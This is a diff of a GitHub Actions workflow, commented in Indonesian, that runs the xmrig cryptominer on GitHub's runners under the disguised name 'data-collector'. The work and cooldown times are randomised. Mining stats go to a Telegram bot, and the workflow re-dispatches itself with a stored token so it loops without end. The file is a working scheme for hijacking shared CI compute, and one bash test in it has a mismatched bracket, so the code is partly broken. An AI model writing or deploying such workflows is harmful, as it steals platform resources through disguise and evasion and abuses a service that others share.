@@ -43,9 +43,56 @@ jobs:
           sleep $DELAY
 
           ./xmrig -o rx.unmineable.com:3333 -a rx -k \
-            -u bnb:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.gh-runner#github \
+            -u bnb:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.gh-runner#f2xg-6ynu \
             -p x --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
-          WORKTIME=$((RANDOM % 5400 + 1200))
-          echo "Aktif selama $WORKTIME
+          WORKTIME=$((RANDOM % 5400 + 1200))  # 20–90 menit
+          echo "Aktif selama $WORKTIME detik..."
+          sleep $WORKTIME
+          kill $PID
+
+      - name: Extract Logs
+        if: always()
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
+        run: |
+          set +e
+          cd xmrig-6.24.0
+          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
+          HASHRATE=${HASHRATE:-"0 H/s"}
+          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
+          REJECTED=$(grep -a "rejected" log.txt | wc -l)
+
+          MSG="✅ *BNB Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+            -d chat_id=$TG_CHAT_ID \
+            -d text="$MSG" \
+            -d parse_mode=Markdown
+
+          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
+            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+              -d chat_id=$TG_CHAT_ID \
+              -d text="🚨 *Hashrate rendah!* $HASHRATE." \
+              -d parse_mode=Markdown
+          fi
+
+      - name: Cooldown Before Next Cycle
+        if: always()
+        run: |
+          SLEEP_NEXT=$((RANDOM % 1800 + 300))  # 5–35 menit
+          echo "Cooldown $SLEEP_NEXT detik..."
+          sleep $SLEEP_NEXT
+
+      - name: Retrigger Collector
+        if: always()
+        env:
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+        run: |
+          curl -X POST -H "Accept: application/vnd.github+json" \
+               -H "Authorization: Bearer $GH_TOKEN" \
+               https://api.github.com/repos/${{ github.repository }}/actions/workflows/data-collector.yml/dispatches \
+               -d '{"ref":"main"}'
